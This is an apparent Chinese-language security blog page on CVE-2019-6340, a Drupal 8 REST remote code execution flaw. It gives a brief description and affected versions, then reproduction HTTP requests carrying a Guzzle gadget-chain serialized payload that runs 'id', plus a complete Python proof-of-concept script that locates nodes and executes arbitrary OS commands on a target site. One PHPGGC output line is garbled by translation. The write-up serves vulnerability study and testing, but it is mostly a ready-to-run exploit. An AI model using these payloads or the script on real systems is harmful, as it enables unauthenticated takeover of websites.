<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2019-6340）Drupal 远程代码执行漏洞一、漏洞简介Drupal Core存在一个远程代码执行漏洞。此次，它的目标是Drupal8的REST模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。**该漏洞本质上是由于用户使用DrupalCore RESTful Web Services(rest)时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Drupal/%EF%BC%88CVE-2019-6340%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2019-6340）Drupal 远程代码执行漏洞一、漏洞简介Drupal Core存在一个远程代码执行漏洞。此次，它的目标是Drupal8的REST模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。**该漏洞本质上是由于用户使用DrupalCore RESTful Web Services(rest)时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:55.114Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Drupal/（CVE-2019-6340）Drupal 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Drupal/%EF%BC%88CVE-2019-6340%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:55.114Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-6340）Drupal-远程代码执行漏洞"><a href="#（CVE-2019-6340）Drupal-远程代码执行漏洞" class="headerlink" title="（CVE-2019-6340）Drupal 远程代码执行漏洞"></a>（CVE-2019-6340）Drupal 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Drupal Core存在一个远程代码执行漏洞。此次，它的目标是Drupal<br>8的REST模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。**该漏洞本质上是由于用户使用Drupal<br>Core RESTful Web Services<br>(rest)时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可能导致任意PHP代码执行。**此外，我们发现针对该漏洞提出的即时补救措施是不完整的，这可能会导致一种错误的安全感。<strong>用户可能会根据官方的说明禁用掉RESTful<br>Web Services<br>中的POST/PATCH方法，但是事实上GET方法也能在无任何权限的情况下执行远程代码，所以用户必须执行Drupal的最新的安全更新或者禁用RESTful<br>Web Services服务，否则网站依旧处于风险当中。</strong></p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Drupal 8.6.x &lt; 8.6.10</p>
<p>Drupal 8.5.x &lt; 8.5.11</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><blockquote>
<p>触发<code>unserialize()</code></p>
</blockquote>
<pre><code>GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1
Host: 192.168.1.25
Content-Type: application/hal+json
Content-Length: 642

&#123;
  &quot;link&quot;: [
    &#123;
      &quot;value&quot;: &quot;link&quot;,
      &quot;options&quot;: &quot;&lt;SERIALIZED_CONTENT&gt;&quot;
    &#125;
  ],
  &quot;_links&quot;: &#123;
    &quot;type&quot;: &#123;
      &quot;href&quot;: &quot;http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default&quot;
    &#125;
  &#125;
&#125;
</code></pre>
<blockquote>
<p>由于Drupal<br>8使用<a target="_blank" rel="noopener" href="http://docs.guzzlephp.org/en/stable/">Guzzle</a>，我们可以使用PHPGGC生成有效负载：</p>
</blockquote>
<pre><code>$ ./phpggc guzzle / rce1系统ID --json
 “ O：24：\” GuzzleHttp \\ Psr7 \\ FnStream \“：2：&#123;s：33：\” \ u0000GuzzleHttp \\ Psr7 \\ FnStream \ u0000methods \“ ; a：1：&#123;s：5：\“ close \”; a：2：&#123;i：0; O：23：\“ GuzzleHttp \\ HandlerStack \”：3：&#123;s：32：\“ \ u0000GuzzleHttp \ \ HandlerStack \ u0000handler \“; s：2：\” id \“; s：30：\” \ u0000GuzzleHttp \\ HandlerStack \ u0000stack \“; a：1：&#123;i：0; a：1：&#123;i：0 ; s：6：\“ system \”;&#125;&#125; s：31：\“ \ u0000GuzzleHttp \\ HandlerStack \ u0000cached \”; b：0;&#125; i：1; s：7：\“ resolve \”;&#125;&#125; s：9：\“ _ fn_close \”; a：2：&#123;i：0; r：4; i：1; s：7：\“ resolve \”;&#125;&#125;“
</code></pre>
<blockquote>
<p>我们可以通过get请求发送有效载荷</p>
</blockquote>
<pre><code>GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1
Host: www.0-sec.org
Content-Type: application/hal+json
Content-Length: 642

&#123;
  &quot;link&quot;: [
    &#123;
      &quot;value&quot;: &quot;link&quot;,
      &quot;options&quot;: &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;a:2:&#123;i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:&#123;s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;s:2:\&quot;id\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000stack\&quot;;a:1:&#123;i:0;a:1:&#123;i:0;s:6:\&quot;system\&quot;;&#125;&#125;s:31:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;&#125;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;s:9:\&quot;_fn_close\&quot;;a:2:&#123;i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;&quot;
    &#125;
  ],
  &quot;_links&quot;: &#123;
    &quot;type&quot;: &#123;
      &quot;href&quot;: &quot;http://www.0-sec.org/drupal-8.6.9/rest/type/shortcut/default&quot;
    &#125;
  &#125;
&#125;
</code></pre>
<blockquote>
<p>返回值</p>
</blockquote>
<pre><code>HTTP/1.1 200 OK
Link: &lt;...&gt;
X-Generator: Drupal 8 (https://www.drupal.org)
X-Drupal-Cache: MISS
Connection: close
Content-Type: application/hal+json
Content-Length: 9012

&#123;...&#125;uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>#!/usr/bin/env python3

# CVE-2019-6340 Drupal &lt;= 8.6.9 REST services RCE PoC
# 2019 @leonjza

# Technical details for this exploit is available at:
#   https://www.drupal.org/sa-core-2019-003
#   https://www.ambionics.io/blog/drupal8-rce
#   https://twitter.com/jcran/status/1099206271901798400

# Sample usage:
#
# $ python cve-2019-6340.py http://127.0.0.1/ &quot;ps auxf&quot;
# CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC
#  by @leonjza
#
# References:
#  https://www.drupal.org/sa-core-2019-003
#  https://www.ambionics.io/blog/drupal8-rce
#
# [warning] Caching heavily affects reliability of this exploit.
# Nodes are used as they are discovered, but once they are done,
# you will have to wait for cache expiry.
#
# Targeting http://127.0.0.1/...
# [+] Finding a usable node id...
# [x] Node enum found a cached article at: 2, skipping
# [x] Node enum found a cached article at: 3, skipping
# [+] Using node_id 4
# [+] Target appears to be vulnerable!
#
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root        49  0.0  0.0   4288   716 pts/0    Ss+  16:38   0:00 sh
# root         1  0.0  1.4 390040 30540 ?        Ss   15:20   0:00 apache2 -DFOREGROUND
# www-data    24  0.1  2.8 395652 57912 ?        S    15:20   0:08 apache2 -DFOREGROUND
# www-data    27  0.1  2.9 396152 61108 ?        S    15:20   0:08 apache2 -DFOREGROUND
# www-data    31  0.0  3.4 406304 70408 ?        S    15:22   0:04 apache2 -DFOREGROUND
# www-data    39  0.0  2.7 398472 56852 ?        S    16:14   0:02 apache2 -DFOREGROUND
# www-data    44  0.2  3.2 402208 66080 ?        S    16:37   0:05 apache2 -DFOREGROUND
# www-data    56  0.0  2.6 397988 55060 ?        S    16:38   0:01 apache2 -DFOREGROUND
# www-data    65  0.0  2.3 394252 48460 ?        S    16:40   0:01 apache2 -DFOREGROUND
# www-data    78  0.0  2.5 400996 51320 ?        S    16:47   0:01 apache2 -DFOREGROUND
# www-data   117  0.0  0.0   4288   712 ?        S    17:20   0:00  \_ sh -c echo

import sys
from urllib.parse import urlparse, urljoin

import requests


def build_url(*args) -&gt; str:
    &quot;&quot;&quot;
        Builds a URL
    &quot;&quot;&quot;

    f = &#39;&#39;
    for x in args:
        f = urljoin(f, x)

    return f


def uri_valid(x: str) -&gt; bool:
    &quot;&quot;&quot;
        https://stackoverflow.com/a/38020041
    &quot;&quot;&quot;

    result = urlparse(x)
    return all([result.scheme, result.netloc, result.path])


def check_drupal_cache(r: requests.Response) -&gt; bool:
    &quot;&quot;&quot;
        Check if a response had the cache header.
    &quot;&quot;&quot;

    if &#39;X-Drupal-Cache&#39; in r.headers and r.headers[&#39;X-Drupal-Cache&#39;] == &#39;HIT&#39;:
        return True

    return False


def find_article(base: str, f: int = 1, l: int = 100):
    &quot;&quot;&quot;
        Find a target article that does not 404 and is not cached
    &quot;&quot;&quot;

    while f &lt; l:
        u = build_url(base, &#39;/node/&#39;, str(f))
        r = requests.get(u)

        if check_drupal_cache(r):
            print(f&#39;[x] Node enum found a cached article at: &#123;f&#125;, skipping&#39;)
            f += 1
            continue

        # found an article?
        if r.status_code == 200:
            return f
        f += 1


def check(base: str, node_id: int) -&gt; bool:
    &quot;&quot;&quot;
        Check if the target is vulnerable.
    &quot;&quot;&quot;

    payload = &#123;
        &quot;_links&quot;: &#123;
            &quot;type&quot;: &#123;
                &quot;href&quot;: f&quot;&#123;urljoin(base, &#39;/rest/type/node/INVALID_VALUE&#39;)&#125;&quot;
            &#125;
        &#125;,
        &quot;type&quot;: &#123;
            &quot;target_id&quot;: &quot;article&quot;
        &#125;,
        &quot;title&quot;: &#123;
            &quot;value&quot;: &quot;My Article&quot;
        &#125;,
        &quot;body&quot;: &#123;
            &quot;value&quot;: &quot;&quot;
        &#125;
    &#125;

    u = build_url(base, &#39;/node/&#39;, str(node_id))
    r = requests.get(f&#39;&#123;u&#125;?_format=hal_json&#39;, json=payload, headers=&#123;&quot;Content-Type&quot;: &quot;application/hal+json&quot;&#125;)

    if check_drupal_cache(r):
        print(f&#39;Checking if node &#123;node_id&#125; is vuln returned cache HIT, ignoring&#39;)
        return False

    if &#39;INVALID_VALUE does not correspond to an entity on this site&#39; in r.text:
        return True

    return False


def exploit(base: str, node_id: int, cmd: str):
    &quot;&quot;&quot;
        Exploit using the Guzzle Gadgets
    &quot;&quot;&quot;

    # pad a easy search replace output:
    cmd = &#39;echo ---- &amp; &#39; + cmd
    payload = &#123;
        &quot;link&quot;: [
            &#123;
                &quot;value&quot;: &quot;link&quot;,
                &quot;options&quot;: &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\u0000&quot;
                           &quot;GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:&#123;s:5:\&quot;&quot;
                           &quot;close\&quot;;a:2:&#123;i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:&quot;
                           &quot;&#123;s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;&quot;
                           &quot;s:|size|:\&quot;|command|\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000&quot;
                           &quot;stack\&quot;;a:1:&#123;i:0;a:1:&#123;i:0;s:6:\&quot;system\&quot;;&#125;&#125;s:31:\&quot;\u0000&quot;
                           &quot;GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;&#125;i:1;s:7:\&quot;&quot;
                           &quot;resolve\&quot;;&#125;&#125;s:9:\&quot;_fn_close\&quot;;a:2:&#123;i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;&quot;
                           &quot;&quot;.replace(&#39;|size|&#39;, str(len(cmd))).replace(&#39;|command|&#39;, cmd)
            &#125;
        ],
        &quot;_links&quot;: &#123;
            &quot;type&quot;: &#123;
                &quot;href&quot;: f&quot;&#123;urljoin(base, &#39;/rest/type/shortcut/default&#39;)&#125;&quot;
            &#125;
        &#125;
    &#125;

    u = build_url(base, &#39;/node/&#39;, str(node_id))
    r = requests.get(f&#39;&#123;u&#125;?_format=hal_json&#39;, json=payload, headers=&#123;&quot;Content-Type&quot;: &quot;application/hal+json&quot;&#125;)

    if check_drupal_cache(r):
        print(f&#39;Exploiting &#123;node_id&#125; returned cache HIT, may have failed&#39;)

    if &#39;----&#39; not in r.text:
        print(&#39;[warn] Command execution _may_ have failed&#39;)

    print(r.text.split(&#39;----&#39;)[1])


def main(base: str, cmd: str):
    &quot;&quot;&quot;
        Execute an OS command!
    &quot;&quot;&quot;

    print(&#39;[+] Finding a usable node id...&#39;)
    article = find_article(base)
    if not article:
        print(&#39;[!] Unable to find a node ID to reference. Check manually?&#39;)
        return

    print(f&#39;[+] Using node_id &#123;article&#125;&#39;)

    vuln = check(base, article)
    if not vuln:
        print(&#39;[!] Target does not appear to be vulnerable.&#39;)
        print(&#39;[!] It may also simply be a caching issue, so maybe just try again later.&#39;)
        return
    print(f&#39;[+] Target appears to be vulnerable!&#39;)

    exploit(base, article, cmd)


if __name__ == &#39;__main__&#39;:

    print(&#39;CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC&#39;)
    print(&#39; by @leonjza\n&#39;)
    print(&#39;References:\n&#39;
          &#39; https://www.drupal.org/sa-core-2019-003\n&#39;
          &#39; https://www.ambionics.io/blog/drupal8-rce\n&#39;)
    print(&#39;[warning] Caching heavily affects reliability of this exploit.\n&#39;
          &#39;Nodes are used as they are discovered, but once they are done,\n&#39;
          &#39;you will have to wait for cache expiry.\n&#39;)

    if len(sys.argv) &lt;= 2:
        print(f&#39;Usage: &#123;sys.argv[0]&#125; &lt;target base URL&gt; &lt;command&gt;&#39;)
        print(f&#39;    Example: &#123;sys.argv[0]&#125; http://127.0.0.1/ id&#39;)

    target = sys.argv[1]
    command = sys.argv[2]
    if not uri_valid(target):
        print(f&#39;Target &#123;target&#125; is not a valid URL&#39;)
        sys.exit(1)

    print(f&#39;Targeting &#123;target&#125;...&#39;)
    main(target, command)
</code></pre>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Drupal/%EF%BC%88CVE-2019-6340%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qo4f005hy8v1310ucyb7" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Drupal/%EF%BC%88CVE-2019-6341%EF%BC%89Drupal%20xss%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Drupal/%EF%BC%88CVE-2019-6339%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>